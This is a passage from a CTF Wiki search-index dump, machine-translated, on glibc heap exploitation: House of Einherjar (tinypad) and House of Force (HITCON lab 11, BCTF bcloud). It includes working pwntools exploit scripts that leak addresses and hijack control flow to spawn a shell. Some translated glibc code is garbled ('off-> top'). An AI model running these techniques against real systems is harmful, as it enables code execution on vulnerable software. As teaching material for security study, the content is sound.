then, if possible, assign a memo. From here we can know that the program only starts from the tiny offset of 16*16=256. Each memo stores two fields, one is the size of the memo, and the other is the pointer corresponding to the memo. So we can create a new structure and modify the tinypad identified by ida to make it more readable (but there is no way for ida to help intelligently identify it). Also, since this add function relies on the read function, there is a vulnerability of off by one. In addition, we can see that the size of the chunk requested by the user is up to 256 bytes, which is exactly the same as the unused 256 bytes in front of the tinypad.</li> <li>Delete, according to the size of the storage memo to determine whether memo is being used, and set the corresponding memo size to 0, but does not set the pointer to NULL, which may result in Use After Free. ** At the beginning of the program, it is possible to output some related content, which is actually the basis for us to leak some base addresses**.</li> <li>Edit. When editing, the program first copies it to the first 256 bytes of tinypad based on the contents of the previously stored memo, but as we said before, when memo stores 256 bytes, there will be off by one Vulnerabilities. At the same time, the program uses strlen to determine the length of the content of the tinypad after copying and output it. After that, the program continues to use strlen to find the length of memo, and reads the specified length of content into the tinypad. According to the read function, <code>\\x00</code> must appear here. Finally, the program will read the contents of the first 256 bytes of the tinypad into the corresponding memo.</li> <li>drop out</li> </ul>"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#use","title":"Use","text":"<p>Basic use ideas are as follows</p> <ol> <li>Using the UAF vulnerability that did not set the pointer to NULL when deleting, the base address of the leaked heap</li> <li>Re-use the UAF vulnerability to leak the base address of libc.</li> <li>Use the house of einherjar method to forge chunks in the first 256 bytes of tinypad. When we apply again, we can control the pointers and contents of the four memo.</li> <li>Although our first thought here may be to directly override malloc_hook as the one_gadget address, however, since the program uses strlen to interpret how much length can be read when editing, malloc_hook is initially 0. So we cover it directly, so here we use other methods, that is, the return address of the main function of the modified program is one_gadget. The reason why it works is because the return address is often beginning with 7f, and the length is long enough to be overwritten as one_gadget. So we still need to leak the return address of the main function. Since libc stores the address of the main function environ pointer, we can first leak the address of environ and then know the address of the return address of the main function. The environ symbol is chosen here because the environ symbol is exported in libc, and argc and argv are not exported, which is relatively cumbersome.</li> <li>Finally, modify the return address of the main function to the one_gadget address to get the shell.</li> </ol> <p>Specific use of the script is as follows</p> <pre><code>from pwn import *\ncontext.terminal = ['gnome-terminal', '-x', 'sh', '-c']\nif args['DEBUG']:\n    context.log_level = 'debug'\ntinypad = ELF(\"./tinypad\")\nif args['REMOTE']:\n    p = remote('127.0.0.1', 7777)\n    libc = ELF('./libc.so.6')\nelse:\n    p = process(\"./tinypad\")\n    libc = ELF('./libc.so.6')\n    main_arena_offset = 0x3c4b20\nlog.info('PID: ' + str(proc.pidof(p)[0]))\n\n\ndef add(size, content):\n    p.recvuntil('(CMD)&gt;&gt;&gt; ')\n    p.sendline('a')\n    p.recvuntil('(SIZE)&gt;&gt;&gt; ')\n    p.sendline(str(size))\n    p.recvuntil('(CONTENT)&gt;&gt;&gt; ')\n    p.sendline(content)\n\n\ndef edit(idx, content):\n    p.recvuntil('(CMD)&gt;&gt;&gt; ')\n    p.sendline('e')\n    p.recvuntil('(INDEX)&gt;&gt;&gt; ')\n    p.sendline(str(idx))\n    p.recvuntil('(CONTENT)&gt;&gt;&gt; ')\n    p.sendline(content)\n    p.recvuntil('Is it OK?\\n')\n    p.sendline('Y')\n\n\ndef delete(idx):\n    p.recvuntil('(CMD)&gt;&gt;&gt; ')\n    p.sendline('d')\n    p.recvuntil('(INDEX)&gt;&gt;&gt; ')\n    p.sendline(str(idx))\n\n\ndef run():\n    p.recvuntil(\n        '  ============================================================================\\n\\n'\n    )\n    # 1. leak heap base\n    add(0x70, 'a' * 8)  # idx 0\n    add(0x70, 'b' * 8)  # idx 1\n    add(0x100, 'c' * 8)  # idx 2\n\n    delete(2)  # delete idx 1\n    delete(1)  # delete idx 0, idx 0 point to idx 1\n    p.recvuntil(' # CONTENT: ')\n    data = p.recvuntil('\\n', drop=True)  # get pointer point to idx1\n    heap_base = u64(data.ljust(8, '\\x00')) - 0x80\n    log.success('get heap base: ' + hex(heap_base))\n\n    # 2. leak libc base\n    # this will trigger malloc_consolidate\n    # first idx0 will go to unsorted bin\n    # second idx1 will merge with idx0(unlink), and point to idx0\n    # third idx1 will merge into top chunk\n    # but cause unlink feture, the idx0's fd and bk won't change\n    # so idx0 will leak the unsorted bin addr\n    delete(3)\n    p.recvuntil(' # CONTENT: ')\n    data = p.recvuntil('\\n', drop=True)\n    unsorted_offset_arena = 8 + 10 * 8\n    main_arena = u64(data.ljust(8, '\\x00')) - unsorted_offset_arena\n    libc_base = main_arena - main_arena_offset\n    log.success('main arena addr: ' + hex(main_arena))\n    log.success('libc base addr: ' + hex(libc_base))\n\n    # 3. house of einherjar\n    add(0x18, 'a' * 0x18)  # idx 0\n    # we would like trigger house of einherjar at idx 1\n    add(0x100, 'b' * 0xf8 + '\\x11')  # idx 1\n    add(0x100, 'c' * 0xf8)  # idx 2\n    add(0x100, 'd' * 0xf8)  #idx 3\n\n    # create a fake chunk in tinypad's 0x100 buffer, offset 0x20\n    tinypad_addr = 0x602040\n    fakechunk_addr = tinypad_addr + 0x20\n    fakechunk_size = 0x101\n    fakechunk = p64(0) + p64(fakechunk_size) + p64(fakechunk_addr) + p64(\n        fakechunk_addr)\n    edit(3, 'd' * 0x20 + fakechunk)\n\n    # overwrite idx 1's prev_size and\n    # set minaddr of size to '\\x00'\n    # idx 0's chunk size is 0x20\n    diff = heap_base + 0x20 - fakechunk_addr\n    log.info('diff between idx1 and fakechunk: ' + hex(diff))\n    # '\\0' padding caused by strcpy\n    diff_strip = p64(diff).strip('\\0')\n    number_of_zeros = len(p64(diff)) - len(diff_strip)\n    for i in range(number_of_zeros + 1):\n        data = diff_strip.rjust(0x18 - i, 'f')\n        edit(1, data)\n    delete(2)\n    p.recvuntil('\\nDeleted.')\n\n    # fix the fake chunk size, fd and bk\n    # fd and bk must be unsorted bin\n    edit(4, 'd' * 0x20 + p64(0) + p64(0x101) + p64(main_arena + 88) +\n         p64(main_arena + 88))\n\n    # 3. overwrite malloc_hook with one_gadget\n\n    one_gadget_addr = libc_base + 0x45216\n    environ_pointer = libc_base + libc.symbols['__environ']\n    log.info('one gadget addr: ' + hex(one_gadget_addr))\n    log.info('environ pointer addr: ' + hex(environ_pointer))\n    #fake_malloc_chunk = main_arena - 60 + 9\n    # set memo[0].size = 'a'*8,\n    # set memo[0].content point to environ to leak environ addr\n    fake_pad = 'f' * (0x100 - 0x20 - 0x10) + 'a' * 8 + p64(\n        environ_pointer) + 'a' * 8 + p64(0x602148)\n    # get a fake chunk\n    add(0x100 - 8, fake_pad)  # idx 2\n    #gdb.attach(p)\n\n    # get environ addr\n    p.recvuntil(' # CONTENT: ')\n    environ_addr = p.recvuntil('\\n', drop=True).ljust(8, '\\x00')\n    environ_addr = u64(environ_addr)\n    main_ret_addr = environ_addr - 30 * 8\n\n    # set memo[0].content point to main_ret_addr\n    edit(2, p64(main_ret_addr))\n    # overwrite main_ret_addr with one_gadget addr\n    edit(1, p64(one_gadget_addr))\n    p.interactive()\n\n\nif __name__ == \"__main__\":\n    run()\n</code></pre>"},{"location":"pwn/linux/glibc-heap/house_of_einherjar/#references","title":"references","text":"<ul> <li> <p>https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606</p> </li> <li> <p>https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf</p> </li> <li> <p>https://bbs.pediy.com/thread-226119.htm</p> </li> </ul>"},{"location":"pwn/linux/glibc-heap/house_of_force/","title":"House Of Force","text":""},{"location":"pwn/linux/glibc-heap/house_of_force/#introduction","title":"Introduction","text":"<p>House Of Force belongs to the House Of XXX series, and House Of XXX is a series of methods for the glibc stacker proposed in the 2004 \"The Malloc Maleficarum-Glibc Malloc Exploitation Techniques\". However, most of the methods proposed in The Malloc Maleficarum have not worked today, and the House Of XXX we are referring to now is quite different from the one written in the 2004 article. But \"The Malloc Maleficarum\" is still a recommended article, you can read the original text here: https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt</p>"},{"location":"pwn/linux/glibc-heap/house_of_force/#principle","title":"Principle","text":"<p>House Of Force is a heap utilization method, but it does not mean that House Of Force must be exploited based on heap vulnerabilities. If a heap based vulnerability is to be exploited by the House Of Force method, the following conditions are required:</p> <ol> <li>Ability to control the size field of the top chunk by overflow, etc.</li> <li>Be able to freely control the size of the heap allocation size</li> </ol> <p>The reason that House Of Force is generated is that glibc handles the top chunk. According to the knowledge of the previous heap data structure, we know that when all the free blocks are unable to meet the requirements, the heap will be split from the top chunk. The corresponding size is used as the space for the heap block.</p> <p>So what happens when the top chunk is used to allocate the size of the heap block to any value controlled by the user? The answer is that you can make the top chunk point to whatever we want, which is equivalent to an arbitrary address write. However, in glibc, the size of the user request and the existing size of the top chunk are verified. <pre><code>// Get the current top chunk and calculate its corresponding size\nvictim = off-&amp;gt; top;\nsize   = chunksize(victim);\n\n// If after splitting, its size still satisfies the minimum size of chunk, then you can split directly.\nif ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) \n\n{\n\n    remainder_size = size - nb;\n\n    remainder      = chunk_at_offset(victim, nb);\n\noff-&amp;gt; top = remainder;\n    set_head(victim, nb | PREV_INUSE |\n\n(av! = &amp;amp; main_arena? NON_MAIN_ARENA: 0));\n    set_head(remainder, remainder_size | PREV_INUSE);\n\n\n\ncheck_malloced_chunk (off, victim, nb);\n    void *p = chunk2mem(victim);\n\n    alloc_perturb(p, bytes);\n\n    return p;\n\n}\n</code></pre></p> <p>However, if you can tamper with size to a large value, you can easily pass this verification, which is what we said earlier that you need a vulnerability that can control the top chunk size field.</p> <pre><code>(unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)\n</code></pre> <p>The general practice is to change the size of the top chunk to -1, because the size is converted to an unsigned number when comparing, so -1 is the largest number of unsigned longs, so you can pass the verification anyway.</p> <pre><code>remainder      = chunk_at_offset(victim, nb);\n\noff-&amp;gt; top = remainder;\n\n\n/* Treat space at ptr + offset as a chunk */\n\n#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))\n</code></pre> <p>After that, the top pointer will be updated, and the next heap block will be allocated to this location. The user only needs to control the pointer to write arbitrary values (write-anything-anywhere).</p> <p>** At the same time, we need to pay attention to the topchunk size will also be updated, the update method is as follows **</p> <pre><code>victim = off-&amp;gt; top;\nsize   = chunksize(victim);\n\nremainder_size = size - nb;\n\nset_head(remainder, remainder_size | PREV_INUSE);\n</code></pre> <p>So, if we want to allocate chunks of size x at the specified location next time, we need to make sure that the remainder_size is not less than x+ MINSIZE.</p>"},{"location":"pwn/linux/glibc-heap/house_of_force/#simple-example-1","title":"Simple example 1","text":"<p>After learning the principles of HOF, we use an example to illustrate the use of HOF. The goal of this example is to tamper with <code>malloc@got.plt</code> by HOF to implement the hijacking process.</p> <pre><code>int main()\n\n{\n\nlong * ptr, * ptr2;\nptr = malloc (0x10);\nptr = (long *) (((long) ptr) +24);\n*ptr=-1; // &amp;lt;=== Change the size field of the top chunk to 0xffffffffffffffff\nMalloc(-4120); // &amp;lt;=== reduce the top chunk pointer\nMalloc(0x10); // &amp;lt;=== allocate blocks to implement arbitrary address writes\n}\n</code></pre> <p>First, we allocate a block of size 0x10 bytes.</p> <pre><code>0x602000: 0x0000000000000000 0x0000000000000021 &amp;lt;=== ptr\n0x602010:   0x0000000000000000  0x0000000000000000\n\n0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;=== top chunk\n\n0x602030:   0x0000000000000000  0x0000000000000000\n</code></pre> <p>Then change the size of the top chunk to 0xffffffffffffffff 1\u20444 In the real problem, this step can be achieved through a vulnerability such as heap overflow. Since -1 is represented by 0xffffffffffffff in the complement, we can assign -1 directly.</p> <pre><code>0x602000: 0x0000000000000000 0x0000000000000021 &amp;lt;=== ptr\n0x602010:   0x0000000000000000  0x0000000000000000\n\n0x602020: 0x0000000000000000 0xffffffffffffffff &amp;lt;=== top chunk size field was changed\n0x602030:   0x0000000000000000  0x0000000000000000\n</code></pre> <p>Notice the top chunk location at this point, and when we make the next allocation, we will change the position of the top chunk to where we want it.</p> <pre><code>0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000100000000  0x0000000000000000\n\n0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1b70 &lt;main_arena+80&gt; : 0x0000000000000000 0x0000000000602020 &amp;lt;=== top chunk at this point everything is fine\n0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78\n</code></pre> <p>Next we execute <code>malloc(-4120);</code>,-4120 is how to get it? First, we need to know the destination address to be written. Here, after I compile the program, 0x601020 is the address of <code>malloc@got.plt</code></p> <pre><code>0x601020:   0x00007ffff7a91130 &lt;=== malloc@got.plt\n</code></pre> <p>So we should point the top chunk to 0x601010 so that the next time we allocate the chunk, we can allocate the memory at <code>malloc@got.plt</code>.</p> <p>After clearing the address of the current top chunk, according to the previous description, the top chunk is located at 0x602020, so we can calculate the offset as follows</p> <p>0x601010-0x602020=-4112</p> <p>In addition, the size of the memory requested by the user becomes an unsigned integer once it enters the function of applying for memory.</p> <pre><code>void *__libc_malloc(size_t bytes) {\n</code></pre> <p>If you want the size of the user input to go through the internal <code>checked_request2size</code>, you can get this size, ie</p> <pre><code>/*\n\n   Check if a request is so large that it would wrap around zero when\n\n   padded and aligned. To simplify some other code, the bound is made\n\n   low enough so that adding MINSIZE will also not wrap around zero.\n\n */\n\n\n\n#define REQUEST_OUT_OF_RANGE(req)                                              \\\n\n    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))\n\n/* pad request bytes into a usable size -- internal version */\n\n//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1\n\n#define request2size(req)                                                      \\\n\n    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \\\n\n         ? MINSIZE                                                             \\\n\n         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)\n\n\n\n/*  Same, except also perform argument check */\n\n\n\n#define checked_request2size(req, sz)                                          \\\n\n    if (REQUEST_OUT_OF_RANGE(req)) {                                           \\\n\n        __set_errno(ENOMEM);                                                   \\\n\n        return 0;                                                              \\\n\n    }                                                                          \\\n\n    (sz) = request2size(req);\n</code></pre> <p>On the one hand, we need to bypass the REQUEST_OUT_OF_RANGE(req) test, that is, the value we pass to malloc is in the negative range, not greater than -2 * MINSIZE, which is generally acceptable.</p> <p>On the other hand, after satisfying the corresponding constraints, we need to make <code>request2size</code> exactly convert to the corresponding size, that is, we need to make ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK exactly -4112. First of all, it is clear that -4112 is chunk aligned, then we only need to subtract SIZE_SZ, MALLOC_ALIGN_MASK to get the corresponding value to be applied. In fact, we only need to reduce SIZE_SZ here, because the more reduced MALLOC_ALIGN_MASK will eventually be aligned. And ** If -4112 is not MALLOC_ALIGN, we need to reduce more. Of course, we'd better make the chunks that are obtained after the allocation are also aligned, because when a chunk is released, an alignment check is performed. **</p> <p>So, after calling <code>malloc(-4120)</code>, we can observe that the top chunk is raised to the position we want.</p> <pre><code>0x7ffff7dd1b20 &lt;main_arena&gt;:\\   0x0000000100000000  0x0000000000000000\n\n0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1b70 &lt;main_arena+80&gt; : 0x0000000000000000 0x0000000000601010 &amp;lt;=== It can be observed that the top chunk is raised\n0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78\n</code></pre> <p>After that, our assigned block will appear at 0x601010+0x10, that is, 0x601020 can change the contents of the got table.</p> <p>However, it should be noted that while being elevated, the content near malloc@got will also be modified.</p> <pre><code>    set_head(victim, nb | PREV_INUSE |\n\n(av! = &amp;amp; main_arena? NON_MAIN_ARENA: 0));\n</code></pre>"},{"location":"pwn/linux/glibc-heap/house_of_force/#simple-example-2","title":"Simple example 2","text":"<p>In the previous example, we demonstrated modifying the contents of the got table above it (lower address) by reducing the pointer of the top chunk by HOF. But HOF can actually make the top chunk pointer increase to modify the content in the high address space. We demonstrate this by using this example.</p> <pre><code>int main()\n\n{\n\nlong * ptr, * ptr2;\nptr = malloc (0x10);\nptr = (long *) (((long) ptr) +24);\n*ptr=-1; &amp;lt;=== Modify top chunk size\nMalloc(140737345551056); &amp;lt;=== Increase the top chunk pointer\n    malloc(0x10);\n\n}\n</code></pre> <p>We can see that the program code is basically the same as the simple example 1, except that the size of the second malloc is different. This time our goal is malloc_hook, we know that malloc_hook is the value of the global variable in libc.so, first look at the memory layout</p> <pre><code>Start              End                Offset             Perm Path\n\n0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/desktop/tst/t1\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/desktop/tst/t1\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/desktop/tst/t1\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n\n0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n\n0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n\n0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n\n0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n\n0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- \n\n0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n\n0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- \n\n0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- \n\n0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]\n\n0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]\n\n0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n\n0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n\n0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- \n\n0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]\n\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]\n</code></pre> <p>You can see that the base address of the heap is 0x602000, and the base address of libc is 0x7ffff7a0d000, so we need to expand the value of the top chunk pointer by HOF to implement the write to malloc_hook. First, the debug knows that the address of __malloc_hook is at 0x7ffff7dd1b10 and takes the calculation.</p> <p>0x7ffff7dd1b00-0x602020-0x10=140737345551056</p> <p>After this malloc, we can observe that the address of the top chunk is raised to 0x00007ffff7dd1b00</p> <pre><code>0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000100000000  0x0000000000000000\n\n0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x00007ffff7dd1b00 &lt;=== top chunk\n\n0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78\n</code></pre> <p>After that, we can control the __malloc_hook value at 0x7ffff7dd1b10 as long as we allocate it again.</p> <pre><code>rax = 0x00007ffff7dd1b10\n\n\n0x400562 &lt;main+60&gt; mov, 0x10\n0x400567 &lt;main+65&gt;        call   0x400410 &lt;malloc@plt&gt;\n</code></pre>"},{"location":"pwn/linux/glibc-heap/house_of_force/#_1","title":"\u5c0f\u8ff0","text":"<p>In this section, we explain the principle of House Of Force and give a simple example of two uses. By observing these two simple examples, we will find that the utilization requirements of HOF are still quite demanding.</p> <ul> <li>First, a vulnerability is required to allow the user to control the size field of the top chunk.</li> <li>Secondly, ** requires the user to freely control the allocation size of malloc**</li> <li>Third, the number of allocations cannot be restricted</li> </ul> <p>In fact, the second of these three points is often the most difficult. In the CTF topic, the size limit of the heap block is often allocated to the user, and the maximum and maximum values cannot be utilized by the HOF method.</p>"},{"location":"pwn/linux/glibc-heap/house_of_force/#hitcon-training-lab-11","title":"HITCON training lab 11","text":"<p>[Topic link] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/hitcontraning_lab11)</p> <p>Here, we mainly modify its magic function to</p>"},{"location":"pwn/linux/glibc-heap/house_of_force/#basic-information","title":"Basic Information","text":"<pre><code>\u279c  hitcontraning_lab11 git:(master) file bamboobox     \n\nbamboobox: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=595428ebf89c9bf7b914dd1d2501af50d47bbbe1, not stripped\n\n\u279c  hitcontraning_lab11 git:(master) checksec bamboobox \n\n[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/hitcontraning_lab11/bamboobox'\n\n    Arch:     amd64-64-little\n\n    RELRO:    Partial RELRO\n\n    Stack:    Canary found\n\n    NX:       NX enabled\n\n    PIE:      No PIE (0x400000)\n</code></pre> <p>The program is a 64-bit dynamic linker.</p>"},{"location":"pwn/linux/glibc-heap/house_of_force/#basic-skills","title":"basic skills","text":"<p>It should be noted that the program starts with 0x10 memory and is used to retain ** two function pointers**.</p> <p>The program probably adds and removes items from the box.</p> <ol> <li>Show the contents of the box, and then the name of each item in the box.</li> <li>Add items to the box, and apply the corresponding memory for each item according to the size of the user input, as the space for storing the name. However, it should be noted that the read name is the <code>read</code> function, the read length parameter is the user input v2, and the read third parameter is the unsigned integer. If we enter a negative number, we can read it. Any length. But we need to make sure that the value satisfies the constraint of <code>REQUEST_OUT_OF_RANGE</code>, so there is a vulnerability of ** any length heap overflow**. But even then, the first time is more difficult to use, because the size of the top chunk of the heap is generally not very large.</li> <li>Modify the name of the item, and read the specified length name from the specified index item according to the given index and size. The length here is read by the user, and there is also a vulnerability of ** any length heap overflow**.</li> <li>Delete the item, set the size of the corresponding item to 0, and set the corresponding content to NULL.</li> </ol> <p>In addition, since the program is mainly a demo program, there is a magic function in the program that can directly read the flag.</p>"},{"location":"pwn/linux/glibc-heap/house_of_force/#use","title":"Use","text":"<p>Since there is a magic function in the program, our core purpose is to override a pointer to a magic function. Here, the program applies a block of memory to store two function pointers at the beginning, hello_message is used at the beginning of the program, and goodbye_message is used at the end of the program, so we can override the program execution flow by overriding goodbye_message. The specific ideas are as follows</p> <ol> <li>Add an item and use a heap overflow vulnerability to overwrite the top chunk to a size of -1, which is the 64-bit maximum.</li> <li>Use the house of force technique to assign the chunk to the base address of the heap.</li> <li>Override goodbye_message as the magic function address to control the program execution flow</li> </ol> <p>** It should be noted here that when triggering the top chunk to move to the specified location, the size should be appropriate to set the new top chunk size so that the detection of the next top chunk can be bypassed. **</p> <p>Exp is as follows</p> <pre><code>#!/usr/bin/env python\n\n# -*- coding: utf-8 -*-\n\n\n\nfrom pwn import *\n\n\n\nr = process('./bamboobox')\n\ncontext.log_level = 'debug'\n\n\n\n\n\ndef additem(length, name):\n\n    r.recvuntil(\":\")\n\n    r.sendline(\"2\")\n\n    r.recvuntil(\":\")\n\n    r.sendline(str(length))\n\n    r.recvuntil(\":\")\n\n    r.sendline(name)\n\n\n\n\n\ndef modify(idx, length, name):\n\n    r.recvuntil(\":\")\n\n    r.sendline(\"3\")\n\n    r.recvuntil(\":\")\n\n    r.sendline(str(idx))\n\n    r.recvuntil(\":\")\n\n    r.sendline(str(length))\n\n    r.recvuntil(\":\")\n\n    r.sendline(name)\n\n\n\n\n\ndef remove(idx):\n\n    r.recvuntil(\":\")\n\n    r.sendline(\"4\")\n\n    r.recvuntil(\":\")\n\n    r.sendline(str(idx))\n\n\n\n\n\ndef show():\n\n    r.recvuntil(\":\")\n\n    r.sendline(\"1\")\n\n\n\n\n\nmagic = 0x400d49\n\n# we must alloc enough size, so as to successfully alloc from fake topchunk\n\nadditem(0x30, \"ddaa\")  # idx 0\n\npayload = 0x30 * 'a'  # idx 0's content\n\npayload += 'a' * 8 + p64(0xffffffffffffffff)  # top chunk's prev_size and size\n\n# modify topchunk's size to -1\n\nmodify(0, 0x41, payload)\n\n# top chunk's offset to heap base\n\noffset_to_heap_base = -(0x40 + 0x20)\n\nmalloc_size = offset_to_heap_base - 0x8 - 0xf\n\n#gdb.attach(r)\n\nadditem(malloc_size, \"dada\")\n\nadditem(0x10, p64(magic) * 2)\n\nprint r.recv()\n\nr.interactive()\n</code></pre> <p>Of course, this problem can also be done using the unlink method.</p>"},{"location":"pwn/linux/glibc-heap/house_of_force/#2016-bctf-bcloud","title":"2016 BCTF bcloud","text":"<p>[Topic link] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/2016_bctf_bcloud)</p>"},{"location":"pwn/linux/glibc-heap/house_of_force/#basic-information_1","title":"Basic Information","text":"<pre><code>\u279c  2016_bctf_bcloud git:(master) file bcloud   \n\nbcloud: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=96a3843007b1e982e7fa82fbd2e1f2cc598ee04e, stripped\n\n\u279c  2016_bctf_bcloud git:(master) checksec bcloud  \n\n[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/2016_bctf_bcloud/bcloud'\n\n    Arch:     i386-32-little\n\n    RELRO:    Partial RELRO\n\n    Stack:    Canary found\n\n    NX:       NX enabled\n\n    PIE:      No PIE (0x8048000)\n</code></pre> <p>It can be seen that this is a dynamically linked 32-bit program that primarily enables Canary protection and NX protection.</p>"},{"location":"pwn/linux/glibc-heap/house_of_force/#basic-skills_1","title":"basic skills","text":"<p>The program is probably a cloud note management system. First, the program will do some initialization, set the user's name, organization, host. The program mainly has the following functions</p> <ol> <li>Create a new note and apply x+4 space as the size of the note based on the user's input x.</li> <li>Show the note, no function. .</li> <li>Edit the note and edit the corresponding content according to the note specified by the user.</li> <li>Delete the note and delete the corresponding note.</li> <li>Synchronize the note and mark all the notes have been synchronized.</li> </ol> <p>However, no flaws were found in these five functions, and the program was revisited. As a result, it was found that the program was vulnerable when it was initialized. .</p> <p>Initial name</p> <pre><code>unsigned int init_name()\n\n{\n\n  char s; // [esp+1Ch] [ebp-5Ch]\n\n  char *tmp; // [esp+5Ch] [ebp-1Ch]\n\n  unsigned int v3; // [esp+6Ch] [ebp-Ch]\n\n\n\nv3 = __readgsdword (0x14u);\n  memset(&amp;s, 0, 0x50u);\n\n  puts(\"Input your name:\");\n\n  read_str(&amp;s, 64, '\\n');\n\n  tmp = (char *)malloc(0x40u);\n\n  name = tmp;\n\n  strcpy(tmp, &amp;s);\n\n  info(tmp);\n\n  return __readgsdword(0x14u) ^ v3;\n\n}\n</code></pre> <p>Here, if the name read by the program is 64 characters, then when the program outputs the corresponding string using the info function, the corresponding tmp pointer content is output, that is, ** leaks the heap address**. .</p> <p>Vulnerabilities when initializing organization and org</p> <pre><code>unsigned int init_org_host()\n\n{\n\n  char s; // [esp+1Ch] [ebp-9Ch]\n\n  char *v2; // [esp+5Ch] [ebp-5Ch]\n\n  char v3; // [esp+60h] [ebp-58h]\n\nchar * v4; // [esp + A4h] [ebp-14h]\n  unsigned int v5; // [esp+ACh] [ebp-Ch]\n\n\n\n  v5 = __readgsdword(0x14u);\n\n  memset(&amp;s, 0, 0x90u);\n\n  puts(\"Org:\");\n\n  read_str(&amp;s, 64, 10);\n\n  puts(\"Host:\");\n\n  read_str(&amp;v3, 64, 10);\n\nv4 = (char *) malloc (0x40u);\n  v2 = (char *)malloc(0x40u);\n\n  org = v2;\n\nhost = v4;\nstrcpy (v4, &amp;amp; v3);\n  strcpy(v2, &amp;s);\n\n  puts(\"OKay! Enjoy:)\");\n\n  return __readgsdword(0x14u) ^ v5;\n\n}\n</code></pre> <p>When reading into an organization, given 64 bytes, the lower address of v2 is overwritten. At the same time, we can know that v2 is a chunk adjacent to the top chunk, and v2 is just adjacent to org. Since 32-bit programs are generally used in 32-bit programs, the content stored in v2 is almost To a large extent, it is not <code>\\x00</code> , so when you execute the strcpy function to copy content to v2, it is likely to overwrite the top chunk. This is where the vulnerability lies.</p>"},{"location":"pwn/linux/glibc-heap/house_of_force/#use_1","title":"Use","text":"<ol> <li>Use the vulnerability at the initialization name to leak the base address of the heap. .</li> <li>Use the house of force to allocate the top chunk to the global 0esize-8 of 0x0804B0A0. When the memory is applied again, it returns the memory at the noteize address, so that we can control the size of all the notes and the corresponding 